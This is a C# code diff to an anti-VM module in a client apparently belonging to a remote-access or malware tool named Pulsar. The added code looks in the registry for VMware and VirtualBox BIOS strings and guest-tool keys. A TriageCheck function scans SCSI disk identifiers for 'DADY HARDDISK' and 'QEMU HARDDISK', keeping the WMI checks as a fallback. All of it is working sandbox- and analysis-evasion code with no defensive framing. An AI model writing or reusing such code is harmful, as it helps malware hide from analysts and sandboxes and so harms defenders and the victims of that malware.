@@ -97,6 +97,46 @@ namespace Pulsar.Client.Anti.VM
         {
             try
             {
+                // Check registry for VM indicators (more reliable than WMI)
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS"))
+                {
+                    if (key != null)
+                    {
+                        var biosVersion = key.GetValue("BIOSVersion")?.ToString();
+                        var systemManufacturer = key.GetValue("SystemManufacturer")?.ToString();
+                        var systemProductName = key.GetValue("SystemProductName")?.ToString();
+
+                        if (biosVersion != null && (biosVersion.Contains("VMware") || biosVersion.Contains("VirtualBox") || biosVersion.Contains("VBOX")))
+                            return true;
+                        if (systemManufacturer != null && (systemManufacturer.Contains("VMware") || systemManufacturer.Contains("innotek")))
+                            return true;
+                        if (systemProductName != null && (systemProductName.Contains("VMware") || systemProductName.Contains("VirtualBox")))
+                            return true;
+                    }
+                }
+
+                // Check for VMware tools registry
+                using (var vmwareKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\VMware, Inc.\VMware Tools"))
+                {
+                    if (vmwareKey != null)
+                        return true;
+                }
+
+                // Check for VirtualBox registry
+                using (var vboxKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Oracle\VirtualBox Guest Additions"))
+                {
+                    if (vboxKey != null)
+                        return true;
+                }
+            }
+            catch
+            {
+                // Registry access failed, assume not VM
+            }
+
+            // Fallback to WMI if registry checks fail
+            try
+            {
                 using (ManagementObjectSearcher ObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 {
                     using (ManagementObjectCollection ObjectItems = ObjectSearcher.Get())
@@ -264,6 +304,46 @@ namespace Pulsar.Client.Anti.VM
         /// <returns>True if specific disk drive models are detected, otherwise false.</returns>
         public static bool TriageCheck()
         {
+            try
+            {
+                // Check registry for disk information (more reliable than WMI)
+                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\Scsi"))
+                {
+                    if (key != null)
+                    {
+                        foreach (var subKeyName in key.GetSubKeyNames())
+                        {
+                            using (var subKey = key.OpenSubKey(subKeyName))
+                            {
+                                if (subKey != null)
+                                {
+                                    foreach (var portKeyName in subKey.GetSubKeyNames())
+                                    {
+                                        using (var portKey = subKey.OpenSubKey(portKeyName))
+                                        {
+                                            if (portKey != null)
+                                            {
+                                                var identifier = portKey.GetValue("Identifier")?.ToString();
+                                                if (!string.IsNullOrEmpty(identifier) &&
+                                                    (identifier.Contains("DADY HARDDISK") || identifier.Contains("QEMU HARDDISK")))
+                                                {
+                                                    return true;
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch
+            {
+                // Registry access failed, assume not VM
+            }
+
+            // Fallback to WMI if registry checks fail
             try
             {
                 using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
